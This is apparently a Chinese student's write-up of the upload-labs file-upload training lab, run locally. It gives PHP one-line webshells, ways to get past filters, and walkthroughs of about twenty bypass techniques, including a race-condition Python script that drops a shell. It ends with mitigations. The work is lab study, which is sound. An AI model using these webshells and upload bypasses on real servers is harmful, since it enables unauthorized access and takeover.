## 一.webshell概念
WebShell（即 “网页后门”）是一种通过 Web 服务（如 HTTP/HTTPS 协议）在远程服务器上执行命令、控制服务器资源的恶意脚本或程序。它本质上是攻击者入侵 Web 服务器后，留下的 “后门工具”，用于长期控制服务器、窃取数据或横向渗透，常被归类为 “Web 应用攻击” 的核心恶意组件之一。
## 二.读写文件，查看环境变量
1. 读写文件`echo "Hello World" > test.txt`覆盖原有内容
2. `echo "追加的内容" >> test.txt`追加内容
3. `notepad test.txt`使用记事本编辑文件（可视化编辑）
4. `type test.txt`查看文件全部内容
5. `more test.txt`分页查看长文件（按Enter翻行，按Q退出）
6. `set`查看所有环境变量
7. `echo %PATH%`查看指定环境变量
## 三.php_webshell
1. 最常见一句话木马`<?php @eval($_POST['a']);?>`
将文件的.php 改为.jpg然后上传可以绕过合法性检测，让后上传用Yakit抓包，将包里的.jpg改为.php后放行，再复制新的请求链接到中国蚁剑，密码为a,即POST[]括号里的内容，让后就注入成功
或者第二种方法，找到index源文件将`checkFile()`函数全部删除，原理：仅通过前端JavaScript函数（`checkFile()`）校验文件后缀，未在后端做任何限制，直接修改前端代码即可绕过，直接将.php后缀的一句话木马注入，后面用蚁剑操作。(前段JS验证)
### 一句话木马多种形式
1. `<?php @eval($_POST['cmd']);phpinfo();?>`基础形式(加phpinfo()一方面是因为flag可能藏在环境变量里，一方面是方便查看是否代码执行成功)
2. `<?= @eval($_POST['cmd']);phpinfo();?>`若`<?php`被过滤了，可以用这种形式
3. `<script language="php">eval($_GET['cmd']);phpinfo();</script>`若`<?`被过滤了，可以用这个
## 四.WriteUp
（用docker搭建环境的话，每次需要先打开Docker desktop程序在命令提示符中输入`cd C:\Users\Lenovo\Desktop\upload-labs-master`即upload-labs的源文件，再输入`docker start upload-labs`打开容器，输入`docker ps`若显示STATUS是UP,则说明打开了，再在浏览器输入网址localhost即可打开,`docker exec -it upload-labs bash`可以进入upload-labs容器）
1. **pass-02(MIME类型验证)**  
 原理：后端仅校验HTTP请求头中的`Content-Type`字段（MIME类型），未校验文件实际内容，修改该字段即可绕过。
 上传.php一句话木马，拦截请求包，将`Content-Type`值修改为合法图片类型，如`image/png`或`image/jpeg`；放包后文件上传成功，再用蚁剑连接，在图片地址输入post请求`a=phpinfo();`得到那个表格。，- MIME类型：用于标识文件格式的HTTP头字段，常见值：`image/png`（PNG图片）、`image/jpeg`（JPG图片）、`application/x-httpd-php`（PHP文件）。
 2. **pass-03** （黑名单验证·特殊后缀绕过）
 **原理**：后端用“黑名单”禁止`.php`后缀，但未禁止`.php3`、`.php5`、`.phtml`等特殊PHP后缀，需配置Apache支持这些后缀解析。
 在phpstudy中找到apache的配置文件httpd.conf，找到`AddType application/x-httpd-php .php .phtml`将#去掉并改为`AddType application/x-httpd-php .php .phtml .php3 .php5`然后重启phpstudy.将一句话木马的后缀改为`.php5`绕过黑名单上传成功，获取图片地址并用蚁剑连接，连接网址`http://localhost:8080/include.php?file=./upload/202509161014305829.php5`显示包含成功，用这个网址连接蚁剑可以成功
 3. **pass-04**
 **原理** ：黑名单禁止了`.php`、`.php3`等后缀，但未禁止`.htaccess`（Apache的目录配置文件），可通过`.htaccess`强制解析图片为PHP。
 构造.htaccess文件，内容为
 ```php
 <FilesMatch "111.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
 ```
 构造图片文件111.jpg内容为`<?php
 phpinfo();
 ?>`
 文件实际为php文件，只是将后缀改成.jpg
 先后上传.htacess文件和111.jpg文件，右键获取图片url地址，访问地址，显示php版本号就是成功了。
 4. **pass-05**
 第五关源码里不区分大小写，可以将.php改为.Php绕过黑名单验证，然后输入`http://localhost:8080/include.php?file=./upload/202509161026075617.Php`连接蚁剑，在这个网址下用hackerbar发送post请求`a=phpinfo();`可以得到php配置表格
5. **pass-06**
 先构建.user.ini文件，内容是`auto_prepend_file = "phpinfo.jpg"`再构建phpinfo.jpg文件内容是`<?php
phpinfo(); 
?>`
先后上传两个文件后访问`http://localhost:8080/include.php?file=./upload/202509160510559592.jpg`可以得到那个php表格
因为windows的特性，上传php文件抓包后再文件后加上 点  空格  点，依然可以上传成功
第六关没有首尾去空，可以在文件后加空格绕过
6. **pass-07**
 第七关再文件名后加点.可以绕过(读源代码可知)
 7. **pass-08**
 第八关可以利用附加数据流绕过，在php中文件附加数据流不会验证后缀，直接上传.php文件，抓包后将文件名后加上`::$DATA`再放行来绕过验证，因为windows会忽视`::$DATA`,所以最终会被解析为php文件
 8. **pass-09**
因为第九关删除文件末尾的点，所以可以抓包后在文件后加点 空格 点来绕过限制上传，放包后，`deldot()`仅去除末尾的点，空格前的点保留，Windows自动忽略空格和末尾的点，最终文件为`cmd.php`
上传成功
9. **pass-10**
```php
$file_name = str_ireplace($deny_ext,"", $file_name);
```
这个函数会将php替换为空，因为函数只执行一次，所以可以双写php绕过，pphphp执行过函数后就变成了php,上传成功
10. **pass-11**
第十一关用GET拼接，在一些老版本的php可以用%00截断路径,找到`GET`参数（如`?save_path=upload/`），改为`?save_path=upload/cmd.php%00` `%00`会将后面的路径截断， 放包后，路径被`%00`截断为`upload/cmd.php`，文件解析为`cmd.php`；
11. **pass-12**
同十一关，但用上传路径在post，get可以自动解码，但post不会，找到`POST`参数（如`save_path=upload/`），改为`save_path=upload/cmd.php+`（`+`用于定位）Convert Selection to Hex」，找到`+`对应的Hex值`2B`，改为`00` 放包后，路径被`0x00`截断为`upload/cmd.php`，文件保存为`cmd.php`；
12. **pass-13**
知识点：- 常见图片文件头：
    - JPG：`FF D8`
    - PNG：`89 50 4E 47`
    - GIF：`47 49 46 38`
以hex打开的第头两个字节为文件头
制作图片马：用`copy 1.jpg/b + cmd.php/a cmd.jpg`（windows指令）将一句话木马嵌入图片中，在上传cmd.jpg即可，然后用蚁剑连接这个网址`http://localhost:8080/include.php?file=./upload/3520250916045246.jpg`3520250916045246.jpg是右键图片得到的网址最后面，为随机数时间戳，其余png,gif同理,如在一句话木马开头加`GIF89a`来伪装gif文件
13. **pass-14**
同十三关，生成图片马，`copy 123.png/b + evalPOST.php/a cmd4.png`将生成的cmd4.png导入，然后用蚁剑连接这个网址`http://localhost:8080/include.php?file=./upload/3720250917102654.png`再生成图片马`copy 123.png/b + phpinfo.php/a cmd5.png`导入后访问`http://localhost:8080/include.php?file=./upload/9720250917103101.png`到一个满是乱码的网页，一直向下翻可以看到php配置表格,或者可以用上一个网址用hackbar发送post请求`a=phpinfo();`
14. **pass-15**
十五关同十四关
15. **pass-16**
二次渲染绕过，二次渲染会将图片马的一句话木马重写掉，保留图片的原始信息，
`imagecreatefromjpeg`函数启动二次渲染流程，但是并不会改变每一部分，只需将php木马插入到不改变的那一部分就行了，通过十六进制编译器（010 editor）处理,用010 editor tools里的比较功能，先用010 editor在gif文件的最后插入一句话木马，上传成功，右键上传的图片保存到电脑，用010 editor 打开发现最后的一句话木马不见了，这时比较插入木马的文件和上传渲染后的文件的相同部分（蓝色标记），将一句话木马插入到gif文件的蓝色部位保存，再次上传，访问`http://localhost:8888/include.php?file=upload1885593630.gif`(8080端口被占用了，所以换成了8888端口)，发送post请求`a=phpinfo();`得到php配置，再用蚁剑连接此网址（这是gif文件的方法）
jpg.png比较困难，略·了·
16. **pass-17**
利用条件竞争，根据源码可知，无论什么文件，他先会被上传到服务器上，再判断是否合法然后进行删除修改等操作，所以文件会在服务器停留很小一段时间，可以写一个python脚本，实现不断访问上传的木马文件，请求太多处理不过来时就可以钻漏洞，直到访问成功(返回200状态码)时才停止访问,写一个文件wshell.php，内容为```
<?php
fputs(fopen('shell.php','w'),'<?php @eval($_POST["a"])?>');
?>```作用是生成小马
执行时会帮我们写入一句话木马,相当于在目录下新建了shell.php,内容为`<?php @eval($_POST["a"])?>`,从而写入一句话木马，如果只写`<?php @eval($_POST["a"])?>`只能连接一瞬间，不能进行任何操作，但一瞬间可以将一句话木马注入，一句话木马称为小马，大马更复杂,抓包后用bp攻击，payload类型为NUll payload,无限重复，然后执行一个python脚本，不断对`http://localhost:8888/upload/wshell.php`或`http://localhost:8888/upload/shell.php`（脚本中的url可以是其中之一，不知道为什么，有时候能用，有时候不能用）发送请求
```python
import requests  
import threading  
import os  
  
  
class RaceCondition(threading.Thread):  
    def __init__(self):  
        threading.Thread.__init__(self)  
        self.url = 'http://localhost:8888/upload/shell.php'  
  
    def _get(self):  
        print('try to call uploaded file...')  
        r = requests.get(self.url)  
        if r.status_code == 200:  
            print(r.text)  
            os._exit(0)  
  
    def run(self):  
        while True:  
            for i in range(5):  
                self._get()  
  
            for i in range(10):  
                self._get()  
  
  
if __name__ == '__main__':  
    threads = 50  
  
    for i in range(threads):  
        t = RaceCondition()  
        t.start()  
  
    for i in range(threads):  
        t.join()
```
脚本执行完则代表上传成功，用蚁剑连接即可（蚁剑好像只能连接`http://localhost:8888/upload/shell.php`），再访问`http://localhost:8888/upload/shell.php`发送Post请求`a=phpinfo();`即可看到那个表格
17. **pass-18**
也利用条件竞争，这一关先检查后缀，再上传服务器，再改名，所以17关方法行不通，apache文件解析漏洞：apache解析文件时，会从后向前解析，每当解析不成功就会向前逐个解析。比如用apache解析shell.php.7z，当apache解析不了.7z时，会往前解析.php，最终文件被当成.php文件解析。可以在php文件后加.7z绕过白名单上传成功（白名单上合法名称很多，但7z 是apache解析不了的），并赶在重命名之前对他进行访问，操作同上，但不知道为什么一直不成功，按理说操作应该类似，还试了图片马的方法，同样不成功，先鸽了。
18. **pass-19**
这一关先判断是否合法，再移动到服务器上，所以不会有条件竞争，这一关可以利用windows自动修正文件后缀的特性绕过，可以将保存名称的后缀改为`.php.`实现上传，但windows会将最后的点删除，最后解析为php文件，用蚁剑连接`http://localhost:8888/include.php?file=upload/upload-19.php.`在这个网址发送post请求`a=phpinfo();`得到配置表格（当然也可以在最后加一个空格，是同理的，windows照样删除）
19. **pass-20**
因为Post参数可以传数组，借助上述特性，回到靶场，当传入参数为`save_name[0]=shell.php&save_name[2]=jpg`时，`$ext`为数组最后一个值jpg，`reset($file)`为数组第一个值`shell.php`，$file_name就拼接成了shell.php.存储在Windows系统下最后一个点会自动删掉，这样就完成木马的注入。
上传一句话木马文件抓包，将content type 改为image/jpeg以便绕过上传，再将下面的```
------WebKitFormBoundaryyvVSQJQwozKMrgj7
Content-Disposition: form-data; name="save_name"

upload-20.jpg
------WebKitFormBoundaryyvVSQJQwozKMrgj7
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryyvVSQJQwozKMrgj7--
```
改为
------WebKitFormBoundaryyvVSQJQwozKMrgj7
Content-Disposition: form-data; name="save_name[0]"

shell.php
------WebKitFormBoundaryyvVSQJQwozKMrgj7
Content-Disposition: form-data; name="save_name[3]"

jpg
------WebKitFormBoundaryyvVSQJQwozKMrgj7
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryyvVSQJQwozKMrgj7--





```

然后放包，上传成功，访问地址`http://localhost:8888/include.php?file=./upload/shell.php.`发送post请求`a=phpinfo();`得到配置表格，最后用蚁剑连接这个地址。
## 五，总结
1. `.php .php5 .php7 .php8 .phtml .php3 .php4 .htaccess .html .user.ini`等后缀可以解析成php文件
2. 设置黑名单或白名单,将文件后缀统一改成小写，首尾去空去点，
去除字符串::$DATA,让php替换为空的函数执行多次，二次渲染阻止图片马注入，先判断文件是否合法再上传服务器，防止条件竞争等方法可以阻止上传恶意木马。
3. `.htaccess`作用：分布式配置文件，一般用于URL重写，认证。访问控制等,作用于 Web 服务器层面（处理请求路由、权限控制等）。
作用范围：特定目录（一般是网站根目录）及其子目录,仅支持 Apache 服务器
优先级较高，可覆盖apache的主配置文件（httpd-conf）- `.htaccess` 中的 PHP 配置（Apache 模块模式）优先级高于 `php.ini`，但低于 `.user.ini`（若同时存在）。
修改后立即生效
`.user.ini`作用：仅用于修改 PHP 配置：通过 `php.ini` 中的可修改指令（`PHP_INI_USER` 或 `PHP_INI_PERDIR` 级别）调整 PHP 行为。仅支持 PHP-FPM 模式（与服务器无关，Nginx、Apache 等均可使用）
 支持 PHP-FPM 模式：在 Nginx + PHP-FPM 环境中，`.user.ini` 是替代 `.htaccess` 实现 PHP 配置的主要方式。
作用于 PHP 解析器层面（仅影响 PHP 运行时配置）
4. windows特有的绕过方法：因为windows会自动删除文件名后的空格和点，所以可以上传.php.文件绕过后缀名检测，上传后windows会自动删除后面的点，从而解析成.php文件
最后吐槽一下，这个task可花费了太多时间和精力了，查资料改配置真要吐血了，但第十八关至今不知道怎么搞。

